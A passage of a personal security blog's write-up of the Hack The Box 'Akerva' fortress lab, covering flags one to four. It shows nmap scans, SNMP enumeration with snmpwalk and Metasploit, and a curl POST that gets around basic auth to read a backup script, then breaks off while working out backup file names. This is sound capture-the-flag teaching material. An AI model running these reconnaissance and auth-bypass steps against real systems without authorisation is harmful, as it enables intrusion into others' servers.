@@ -1,0 +1,949 @@
+<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="/scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="/scripts/lightbox/lightbox.css"> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="description" content="The Fortress is currently active , Better you just own it first and then enter the last flag to decrypt the writeup.If you completed the fortress then you can simply enter the last flag of the Akerva fortress , Thanks for visiting" /><meta property="og:title" content="Fortress Akerva writeup" /><meta property="og:description" content="The Fortress is currently active , Better you just own it first and then enter the last flag to decrypt the writeup.If you completed the fortress then you can simply enter the last flag of the Akerva fortress , Thanks for visiting" /><meta property="og:image" content="https://0xprashant.github.io/hackthebox/akerva/akerva.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Fortress Akerva writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="The Fortress is currently active , Better you just own it first and then enter the last flag to decrypt the writeup.If you completed the fortress then you can simply enter the last flag of the Akerva fortress , Thanks for visiting"><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/akerva/akerva.png"><title>Fortress Akerva writeup | 0xPrashant</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xPrashant</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Fortress Akerva writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Fortress Akerva writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Jun 12, 2020, 12:00 AM +0800" > Jun 12 <i class="unloaded">2020-06-12T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/akerva/akerva.png" class="post-preview-img"><h1 id="introductionakerva">Introduction@Akerva:~$</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>Akerva<tr><td>IP<td>10.13.37.11<tr><td>Category<td>Fortress<tr><td>Os<td>Linux<tr><td>Creator<td><a href="https://akerva.com/" target="_blank">https://akerva.com/</a><tr><td>Difficulty<td>Medium</table></div><h1 id="briefakerva">Brief@akerva:~$</h1><p>Enumerating <code class="language-plaintext highlighter-rouge">snmp</code> using <strong>snmpwalk</strong> or <strong>metasploit</strong> , Got some queries and a <strong><code class="language-plaintext highlighter-rouge">bash-script</code></strong> which is forbidden for us but changing the <strong>request method</strong> we can read the script , The script is creating a <strong>backup</strong> of <code class="language-plaintext highlighter-rouge">website</code> in every 17 min with the name <code class="language-plaintext highlighter-rouge">backup_timestamp</code> . Fuzzing the file using wfuzz i got the zip file , Enumerating the files got some creds using them i logged in myself to port <code class="language-plaintext highlighter-rouge">5000</code> and then exploiting the <strong><code class="language-plaintext highlighter-rouge">Werkzeug</code></strong> got a pin.Got reverse shell using the <strong>Python-interactive-web-Console</strong> . Exploiting the <code class="language-plaintext highlighter-rouge">sudo</code> as the version that is installed has a public <strong>exploit</strong> available. Got <code class="language-plaintext highlighter-rouge">root</code> shell</p><h1 id="summary-">Summary :~$</h1><ul><li><strong>view-page</strong> source on initial webpage<li><code class="language-plaintext highlighter-rouge">#1 flag</code> - <strong>Plain Sight</strong><li>Scanning for <strong>udp-ports</strong> and got <code class="language-plaintext highlighter-rouge">snmp</code> protocol running<li>Using <strong>snmpwalk</strong> or <strong>metasploit</strong> enumerating <code class="language-plaintext highlighter-rouge">snmp</code> protocol<li><code class="language-plaintext highlighter-rouge">#2 Flag</code> - <strong>Take a Look Around</strong><li>Got a file called <strong>backup_every_17minutes.sh</strong> which is initially forbidden<li>Changing the <code class="language-plaintext highlighter-rouge">request-method</code> and we can read the file<li><code class="language-plaintext highlighter-rouge">#3 Flag</code> - <strong>Dead Poets</strong><li>The Script is <code class="language-plaintext highlighter-rouge">backing</code> up the website to a zip file<li>The name of zip file is <strong>backup_timestamp</strong><li>Fuzzing the <strong>timestamp</strong> and got the backup zip file<li><strong>Enumerating</strong> files and dirs got a python script which contains <code class="language-plaintext highlighter-rouge">creds</code><li><code class="language-plaintext highlighter-rouge">#4 Flag</code> - <strong>Now You See Me</strong><li>Login to port <strong>5000</strong><li>Reading the <code class="language-plaintext highlighter-rouge">python</code> script and got a new <code class="language-plaintext highlighter-rouge">file</code> which is opening a file by a <code class="language-plaintext highlighter-rouge">parameter</code> <strong>filename</strong><li>Confirming the <strong>LFI</strong> and reading some sensitive files<li><code class="language-plaintext highlighter-rouge">#5 Flag</code>- <strong>Open Book</strong><li>Got the <strong>python-interactive-console</strong> which is protected by a pin<li>Exploiting the <code class="language-plaintext highlighter-rouge">Werkzeug</code> and getting the pin for console<li>Running commands in <strong>Console</strong> and got rev shell as <code class="language-plaintext highlighter-rouge">aas</code><li><code class="language-plaintext highlighter-rouge">#6 Flag</code> - <strong>say Friend and Enter</strong><li>The <code class="language-plaintext highlighter-rouge">sudo</code> version that is installed is <strong>vulnerable</strong> to public exploit.<li><strong>Compiling</strong> the c file and <strong>running</strong> it on the machine<li>Got shell as <code class="language-plaintext highlighter-rouge">root</code><li><code class="language-plaintext highlighter-rouge">#7 Flag</code> - <strong>Super Mushroom</strong><li>Got <strong>secure_note.md</strong> which contains a b64 string<li>Decoding it as <code class="language-plaintext highlighter-rouge">vigenere cipher</code> by plain text attack<li><code class="language-plaintext highlighter-rouge">#8 Flag</code> - <strong>Little Secret</strong></ul><h1 id="pwned">Pwned</h1><html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body> <asciinema-player src="/hackthebox/akerva/akerva.cast" start-at="0" autoplay="1.5" speed="2.0" loop="1" cols="150" rows="20"></asciinema-player> <script src="/asciinema-player.js"></script><h1 id="recon">Recon</h1><h2 id="nmap---tcp">Nmap - Tcp</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre><td class="rouge-code"><pre>➜  akerva nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-oA</span> scans/nmap.full <span class="nt">-p-</span> <span class="nt">-T4</span> <span class="nt">-v</span> akerva.htb
+<span class="c"># Nmap 7.80 scan initiated Thu Jun 18 00:26:27 2020 as: nmap -sV -sC -oA scans/nmap.full -p- -T4 -v akerva.htb</span>
+Nmap scan report <span class="k">for </span>akerva.htb <span class="o">(</span>10.13.37.11<span class="o">)</span>
+Host is up <span class="o">(</span>0.45s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65532 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 0d:e4:41:fd:9f:a9:07:4d:25:b4:bd:5d:26:cc:4f:da <span class="o">(</span>RSA<span class="o">)</span>
+|   256 f7:65:51:e0:39:37:2c:81:7f:b5:55:bd:63:9c:82:b5 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 28:61:d3:5a:b9:39:f2:5b:d7:10:5a:67:ee:81:a8:5e <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Did not follow redirect to http://10.13.37.11/
+|_https-redirect: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+5000/tcp open  http    Werkzeug httpd 0.16.0 <span class="o">(</span>Python 2.7.15+<span class="o">)</span>
+| http-auth: 
+| HTTP/1.0 401 UNAUTHORIZED<span class="se">\x</span>0D
+|_  Basic <span class="nv">realm</span><span class="o">=</span>Authentication Required
+| http-methods: 
+|_  Supported Methods: HEAD OPTIONS GET
+|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
+|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Jun 18 00:45:54 2020 -- 1 IP address (1 host up) scanned in 1166.81 seconds
+</span></pre></table></code></div></div><p>Only 3 <code class="language-plaintext highlighter-rouge">tcp</code> ports are opened 2 of them are <strong>http</strong></p><h1 id="1---flag">#1 - Flag</h1><h2 id="port---80">Port - 80</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/akerva/3e53ba6a-b875-4f71-a307-9684d6942744/image-1.png" alt="Port-80" /></p><p>Its just some basic site which is running with CMS <code class="language-plaintext highlighter-rouge">wordpress</code></p><p>And simply just <code class="language-plaintext highlighter-rouge">viewing-page source</code> of the initial web page i got the <strong>first</strong> flag</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/akerva/3e53ba6a-b875-4f71-a307-9684d6942744/image-2.png" alt="#1-flag akerva fortress" /></p><p>So that was so quick and ezpz</p><h1 id="2---flag">#2 - Flag</h1><p>There is onw more <code class="language-plaintext highlighter-rouge">http</code> port running/opened (5000)</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/akerva/3e53ba6a-b875-4f71-a307-9684d6942744/image-3.png" alt="Port-5000" /></p><p>It requires to be signed in …</p><p>I tried to bruteforce the login but that was just what i wished only</p><p>Now i just <strong>decided</strong> to scan for the <code class="language-plaintext highlighter-rouge">udp</code> ports so i can something better</p><h2 id="nmap---udp">Nmap - Udp</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre>➜  akerva nmap <span class="nt">-sV</span> <span class="nt">-sU</span> <span class="nt">-oA</span> scans/nmap.udp <span class="nt">-T4</span> <span class="nt">-v</span> akerva.htb 
+<span class="c"># Nmap 7.80 scan initiated Thu Jun 18 00:25:39 2020 as: nmap -sV -sU -oA scans/nmap.udp -T4 -v akerva.htb</span>
+Increasing send delay <span class="k">for </span>10.13.37.11 from 0 to 50 due to 11 out of 17 dropped probes since last increase.
+Warning: 10.13.37.11 giving up on port because retransmission cap hit <span class="o">(</span>6<span class="o">)</span><span class="nb">.</span>
+Increasing send delay <span class="k">for </span>10.13.37.11 from 200 to 400 due to 11 out of 14 dropped probes since last increase.
+Increasing send delay <span class="k">for </span>10.13.37.11 from 400 to 800 due to 11 out of 23 dropped probes since last increase.
+Nmap scan report <span class="k">for </span>akerva.htb <span class="o">(</span>10.13.37.11<span class="o">)</span>
+Host is up <span class="o">(</span>0.34s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 994 closed ports
+PORT      STATE         SERVICE      VERSION
+161/udp   open          snmp         SNMPv1 server<span class="p">;</span> net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
+1718/udp  open|filtered h225gatedisc
+16948/udp open|filtered unknown
+21847/udp open|filtered netspeak-cs
+49156/udp open|filtered unknown
+60172/udp open|filtered unknown
+Service Info: Host: Leakage
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Thu Jun 18 00:44:22 2020 -- 1 IP address (1 host up) scanned in 1122.65 seconds</span>
+</pre></table></code></div></div><p>As i thought the <code class="language-plaintext highlighter-rouge">snmp</code> port is opened and its running on the <strong>SNMPv1</strong> and we actually can <code class="language-plaintext highlighter-rouge">enumerate</code> on the <strong>snmp</strong> , I used <code class="language-plaintext highlighter-rouge">snmpwalk</code> and <strong>metasploit</strong> both for enumerating the <strong>snmp</strong></p><h2 id="snmpwalk">snmpwalk</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>➜  prashant perl /usr/share/doc/libnet-snmp-perl/examples/snmpwalk.pl <span class="nt">-v</span> 1 <span class="nt">-c</span> public 10.13.37.11
+
+1.3.6.1.2.1.25.4.2.1.5.1221 <span class="o">=</span> OCTET STRING: /opt/check_devSite.sh                                                      
+1.3.6.1.2.1.25.4.2.1.5.1224 <span class="o">=</span> OCTET STRING: /var/www/html/dev/space_dev.py                                                            
+1.3.6.1.2.1.25.4.2.1.5.1225 <span class="o">=</span> OCTET STRING: /var/www/html/scripts/backup_every_17minutes.sh AKERVA<span class="o">{</span><span class="c">#2 - Flag}     </span>
+1.3.6.1.2.1.25.4.2.1.5.1235 <span class="o">=</span> OCTET STRING: /var/www/html/dev/space_dev.py 
+</pre></table></code></div></div><h2 id="metasploit">Metasploit</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre><span class="o">[</span><span class="k">*</span><span class="o">]</span> Auxiliary module execution completed                                                                                                     
+msf5 auxiliary<span class="o">(</span>scanner/snmp/snmp_enum<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS 10.13.37.10  
+msf5 auxiliary<span class="o">(</span>scanner/snmp/snmp_enum<span class="o">)</span> <span class="o">&gt;</span> run                                                              
+<span class="o">[</span>+] 10.13.37.11, Connected.           
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> System information:                                             
+Host IP                       : 10.13.37.11                                                                                        
+Hostname                      : Leakage                                                                           
+Description                   : Linux Leakage 4.15.0-72-generic <span class="c">#81-Ubuntu SMP Tue Nov 26 12:20:02 UTC 2019 x86_64                                                     </span>
+Contact                       : Me &lt;me@example.org&gt;: Sitting on the Dock of the Bay                                                                                                   
+Uptime snmp                   : 05:39:02.95   
+Uptime system                 : 05:38:42.23                                                     
+System <span class="nb">date</span>                   : 2020-6-13 10:10:33.0
+
+1236                runnable            backup_every_17     /bin/bash           /var/www/html/scripts/backup_every_17minutes.sh AKERVA<span class="o">{</span><span class="c">#2 - Flag}</span>
+1241                runnable            python              /usr/bin/python     /var/www/html/dev/space_dev.py
+1243                runnable            uuidd               /usr/sbin/uuidd     <span class="nt">--socket-activation</span> 
+
+</pre></table></code></div></div><p>I got some <code class="language-plaintext highlighter-rouge">query</code> of the output from <strong>metasploit</strong> and <strong>snmpwalk</strong> and the flag too</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>1.3.6.1.2.1.25.4.2.1.5.1225 <span class="o">=</span> OCTET STRING: /var/www/html/scripts/backup_every_17minutes.sh AKERVA<span class="o">{</span><span class="c">#2 - Flag}     </span>
+</pre></table></code></div></div><h1 id="3---flag">#3 - Flag</h1><p>I got two files here</p><ul><li><code class="language-plaintext highlighter-rouge">/dev/space_dev.py</code><li><code class="language-plaintext highlighter-rouge">/scripts/backup_every_17minutes.sh</code></ul><p>I need to verify if they do exist or not on website</p><blockquote><p>backup_every_17minutes.sh</p></blockquote><p>Oh…its also asking for <strong>username</strong> and <strong>password</strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/akerva/3e53ba6a-b875-4f71-a307-9684d6942744/image-4.png" alt="backup-script" /></p><p>I just changed the request method to <code class="language-plaintext highlighter-rouge">post</code> , Sometime it just bypass these type of <code class="language-plaintext highlighter-rouge">logins</code></p><h2 id="using-curl">Using Curl</h2><blockquote><p>Post request</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre><td class="rouge-code"><pre>➜  prashant curl <span class="nt">-XPOST</span> http://akerva.htb/scripts/backup_every_17minutes.sh
+<span class="c">#!/bin/bash</span>
+<span class="c">#</span>
+<span class="c"># This script performs backups of production and development websites.</span>
+<span class="c"># Backups are done every 17 minutes.</span>
+<span class="c">#</span>
+<span class="c"># AKERVA{#3 - Flag}</span>
+<span class="c">#</span>
+
+<span class="nv">SAVE_DIR</span><span class="o">=</span>/var/www/html/backups
+
+<span class="k">while </span><span class="nb">true
+</span><span class="k">do
+	</span><span class="nv">ARCHIVE_NAME</span><span class="o">=</span>backup_<span class="si">$(</span><span class="nb">date</span> +%Y%m%d%H%M%S<span class="si">)</span>
+	<span class="nb">echo</span> <span class="s2">"Erasing old backups..."</span>
+	<span class="nb">rm</span> <span class="nt">-rf</span> <span class="nv">$SAVE_DIR</span>/<span class="k">*</span>
+
+	<span class="nb">echo</span> <span class="s2">"Backuping..."</span>
+	zip <span class="nt">-r</span> <span class="nv">$SAVE_DIR</span>/<span class="nv">$ARCHIVE_NAME</span> /var/www/html/<span class="k">*</span>
+
+	<span class="nb">echo</span> <span class="s2">"Done..."</span>
+	<span class="nb">sleep </span>1020
+<span class="k">done</span>
+</pre></table></code></div></div><h2 id="using-burp-suite">Using Burp-Suite</h2><p>I captured the request on my <code class="language-plaintext highlighter-rouge">burp</code> and send it to <strong>repeater</strong></p><blockquote><p>Request</p></blockquote><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/scripts/backup_every_17minutes.sh</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">akerva.htb</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9,hi;q=0.8</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+</pre></table></code></div></div><blockquote><p>Response</p></blockquote><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 18 Jun 2020 07:33:33 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.29 (Ubuntu)</span>
+<span class="na">Last-Modified</span><span class="p">:</span> <span class="s">Sat, 07 Dec 2019 01:02:50 GMT</span>
+<span class="na">ETag</span><span class="p">:</span> <span class="s">"196-59912b8b37f2f"</span>
+<span class="na">Accept-Ranges</span><span class="p">:</span> <span class="s">bytes</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">406</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/x-sh</span>
+
+<span class="c">#!/bin/bash</span>
+<span class="c">#</span>
+<span class="c"># This script performs backups of production and development websites.</span>
+<span class="c"># Backups are done every 17 minutes.</span>
+<span class="c">#</span>
+<span class="c"># AKERVA{#3 - Flag}</span>
+<span class="c">#</span>
+
+<span class="nv">SAVE_DIR</span><span class="o">=</span>/var/www/html/backups
+
+<span class="k">while </span><span class="nb">true
+</span><span class="k">do
+	</span><span class="nv">ARCHIVE_NAME</span><span class="o">=</span>backup_<span class="si">$(</span><span class="nb">date</span> +%Y%m%d%H%M%S<span class="si">)</span>
+	<span class="nb">echo</span> <span class="s2">"Erasing old backups..."</span>
+	<span class="nb">rm</span> <span class="nt">-rf</span> <span class="nv">$SAVE_DIR</span>/<span class="k">*</span>
+
+	<span class="nb">echo</span> <span class="s2">"Backuping..."</span>
+	zip <span class="nt">-r</span> <span class="nv">$SAVE_DIR</span>/<span class="nv">$ARCHIVE_NAME</span> /var/www/html/<span class="k">*</span>
+
+	<span class="nb">echo</span> <span class="s2">"Done..."</span>
+	<span class="nb">sleep </span>1020
+<span class="k">done</span>
+</pre></table></code></div></div><h1 id="4---flag">#4 - Flag</h1><p>So i can read the <code class="language-plaintext highlighter-rouge">flag</code> as well as the whole <code class="language-plaintext highlighter-rouge">backup</code> script , So basically what the script is doing</p><ul><li><strong>Backing up the content of the website to a zip file</strong><li><strong>The zip file is saved as <code class="language-plaintext highlighter-rouge">backup_timestamp</code> and it repeats in every 17 min</strong><li><strong>SO the zip_file name is changing in every <code class="language-plaintext highlighter-rouge">1020</code> secs that is 17 min</strong><li><strong>The backup file is available on the website in <code class="language-plaintext highlighter-rouge">backups</code> dir</strong></ul><p>So as i know now that there is a file called <code class="language-plaintext highlighter-rouge">backup_$timestamp</code> on the website itself but since the file name is changing in every <code class="language-plaintext highlighter-rouge">17</code> mins so we actually dont know its name , We can simply get the current time of the machine by sending a <code class="language-plaintext highlighter-rouge">GET</code> request using curl.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>➜  prashant curl <span class="nt">-I</span> http://akerva.htb
+HTTP/1.1 301 Moved Permanently
+Date: Thu, 18 Jun 2020 13:54:42 GMT
+Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+X-Pingback: http://10.13.37.11/xmlrpc.php
+X-Redirect-By: WordPress
+Location: http://10.13.37.11/
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">date</code> header reveals the current date on the machine</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>Date: Thu, 18 Jun 2020 13:54:42 GMT
